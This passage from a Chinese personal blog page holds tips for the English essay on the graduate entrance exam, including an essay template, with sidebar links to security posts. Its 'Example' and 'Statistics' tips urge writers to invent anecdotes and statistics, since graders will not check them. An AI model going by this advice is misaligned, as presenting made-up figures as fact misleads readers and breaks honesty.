<pre><code><span class="keyword">To</span> illustrate the point, <span class="keyword">let</span>’s <span class="keyword">take</span> a look at what President Bush said <span class="keyword">in</span> anarticle: “……”<span class="built_in">. </span>
</code></pre><h4 id="二、Example_举例（可以通过天花乱坠的想象来达到）">二、Example 举例（可以通过天花乱坠的想象来达到）</h4><p>如：只要一举例，凡是好事就说象my friend，Jerry，怎么怎么样；而凡是坏事就说象my neighbor 如何如何。<br>e.g. 2000年考研作文图画是为什么船多而鱼少了呢？<br>举例：我邻居20人，每人每天吃5条鱼，吃一年下来，可想而知道。据了解，有70%的中国家庭都是这么干的！（这几句用英文写出来，嘿嘿，你看看有多少字了？）<br>因此从上面这个例子你可以发现你在作文当中写的什么内容不要害怕其是否真实，因为内容改卷老师是不会留意的，你的目标就是把作文写的尽可能的长还有段首段尾的句子足够漂亮。 </p>
<h4 id="三、Statistics_统计数字">三、Statistics 统计数字</h4><p>就是随便找数字，成立一个统计结果，格式可以参考我们在问题类作文段一时候的举例。 </p>
<h2 id="写在最后">写在最后</h2><p>1.上面用英文列出的句式一定要熟记背牢，当然，你再另外总结一些类似的句式，尤其是能大量用上考研单词的句式。 </p>
<p>2.四类作文的结构要熟记，三大Flex要时时会用，常常是无法想象或没有东西可写的时候，Flex就要派上用场。 </p>
<p>3.训练作文可以从12月上旬开始，就拿历年的考题来，先判断是哪类作文，然后用中文把整篇文章的结构先构思出来，如往年的cartoon，说的是养老足球赛，段一就简单描述<br>一下画面马上引出，现在养老的问题得到社会的越来越多的重视，接着段二就开始分析为什么会出现儿女不愿意养老的原因，第一，第二，第三是因为什么什么，每一点原因进行扩展；段三就提出对策（因为是问题类作文）。 </p>
<p>4.原帖最先发于考研论坛，链接：<a href="http://bbs.kaoyan.com/t4684739p1" target="_blank" rel="external">http://bbs.kaoyan.com/t4684739p1</a></p>
<p>后话：<br>考研英语真的存在一些运气成分，四级没过，不怕，六级没过，更不能怕。你要做的，踏踏实实过好每一天。因为我就是四级没过工科考59分的一个民办三本普通学生，不过在研一的时候还是用用功把四级给过了，下半年把学位英语过了，也是刚查到，现在研二在帝都实习了，做it安全方面的，虽不是码农也是一个it民工啊，与后来者共勉吧。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2012/10/27/study-english-kaoyan-composition/" data-id="civbwoo7l00255p6i8kjwie3f" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2012/10/27/study-english-kaoyan-composition/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/english/">english</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-diary-about-graduate" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2012/07/03/diary-about-graduate/" class="article-date">
  <time datetime="2012-07-02T16:23:11.000Z" itemprop="datePublished">2012-07-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/diary/">diary</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2012/07/03/diary-about-graduate/">关于毕业</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li><p>毕业，就像一个大大的句号
        
          <p class="article-more-link">
            <a href="/2012/07/03/diary-about-graduate/#more">Read More</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2012/07/03/diary-about-graduate/" data-id="civbwoock005e5p6ijy8h6933" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2012/07/03/diary-about-graduate/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/无法描述/">无法描述</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-study-english-topic-composition" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2012/06/07/study-english-topic-composition/" class="article-date">
  <time datetime="2012-06-07T06:11:11.000Z" itemprop="datePublished">2012-06-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/study/">study</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2012/06/07/study-english-topic-composition/">话题作文模版</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>话题作文模板</p>
<p>&#160; &#160; &#160; &#160;In rencent years,there has been a growing concern among the general public over the issue of…Nothing can be more serious(meaningful)than the issue of it.As regards the issue of…different people have different opinions,there is a popular discussion,some people think…,other people,however think that…</p>
<p>&#160; &#160; &#160; &#160;Just as any coin has two side,it’s no exception with the issue of…,If i’m allowed to make a decision,i prefer to do sth. rather than do sth.(eg:I prefer to agree wiht him rather than deny his ).For the following resaon.In the first place…In the second place…In the end(what is more)…</p>
<p>&#160; &#160; &#160; &#160;In fact,this phenomenon is easy to find in our lives.we should try every means to enhance the public awarness of the issue of…(negative situation,add a sentence：we should take immediate measures,for if the present situation continues as before,serious outcome will come up).only through this measures,i firmly believe will the above-discussed problem be efficiently resolved.our lives will be better and better.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2012/06/07/study-english-topic-composition/" data-id="civbwoo7i00205p6id8sb3e47" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2012/06/07/study-english-topic-composition/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/english/">english</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/7/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/9/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分類</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/android/">android</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/diary/">diary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/technic/">technic</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/virus/">virus</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">標籤</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/adb/">adb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/challenge/">challenge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/debug/">debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/english/">english</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iovyroot/">iovyroot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libstagefright/">libstagefright</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lol/">lol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nvidia/">nvidia</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pingpongroot/">pingpongroot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pxn/">pxn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smali/">smali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/symbol/">symbol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/task/">task</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/thread/">thread</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/uac/">uac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webview/">webview</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xposed/">xposed</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/下载/">下载</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/感染/">感染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/推广/">推广</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/无法描述/">无法描述</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流氓/">流氓</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/淘宝客/">淘宝客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/盗号/">盗号</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/过滤/">过滤</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/驱动/">驱动</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">標籤雲</h3>
    <div class="widget tagcloud">
      <a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/challenge/" style="font-size: 13.33px;">challenge</a> <a href="/tags/cve/" style="font-size: 18.33px;">cve</a> <a href="/tags/debug/" style="font-size: 10px;">debug</a> <a href="/tags/english/" style="font-size: 13.33px;">english</a> <a href="/tags/iovyroot/" style="font-size: 10px;">iovyroot</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/libstagefright/" style="font-size: 11.67px;">libstagefright</a> <a href="/tags/lol/" style="font-size: 10px;">lol</a> <a href="/tags/nvidia/" style="font-size: 10px;">nvidia</a> <a href="/tags/pingpongroot/" style="font-size: 10px;">pingpongroot</a> <a href="/tags/pxn/" style="font-size: 10px;">pxn</a> <a href="/tags/shellcode/" style="font-size: 10px;">shellcode</a> <a href="/tags/smali/" style="font-size: 10px;">smali</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/symbol/" style="font-size: 10px;">symbol</a> <a href="/tags/task/" style="font-size: 10px;">task</a> <a href="/tags/thread/" style="font-size: 10px;">thread</a> <a href="/tags/uac/" style="font-size: 10px;">uac</a> <a href="/tags/webview/" style="font-size: 10px;">webview</a> <a href="/tags/xposed/" style="font-size: 11.67px;">xposed</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/下载/" style="font-size: 10px;">下载</a> <a href="/tags/感染/" style="font-size: 16.67px;">感染</a> <a href="/tags/推广/" style="font-size: 10px;">推广</a> <a href="/tags/无法描述/" style="font-size: 20px;">无法描述</a> <a href="/tags/流氓/" style="font-size: 10px;">流氓</a> <a href="/tags/淘宝客/" style="font-size: 10px;">淘宝客</a> <a href="/tags/盗号/" style="font-size: 13.33px;">盗号</a> <a href="/tags/过滤/" style="font-size: 11.67px;">过滤</a> <a href="/tags/驱动/" style="font-size: 15px;">驱动</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">彙整</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">October 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">July 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">July 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">May 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">March 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">January 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">October 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">July 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">June 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">April 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">December 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">July 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">June 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/05/">May 2011</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2016/11/09/exploit-kernel-security-flaws/">KERNEL SECURITY FLAWS (0day for nexus4)</a>
          </li>
        
          <li>
            <a href="/2016/10/24/exploit-cve-2016-5195/">CVE-2016-5195</a>
          </li>
        
          <li>
            <a href="/2016/09/04/exploit-perf_event-vul/">PERF_EVENT VUL</a>
          </li>
        
          <li>
            <a href="/2016/08/09/exploit-bypass-pxn/">绕过PXN保护</a>
          </li>
        
          <li>
            <a href="/2016/07/07/exploit-cve-2015-1805/">CVE-2015-1805</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 idhyt<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    
<script>
  var disqus_shortname = 'idhyt';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>


<script src="/js/script.js" type="text/javascript"></script>

  </div>
</body>
</html>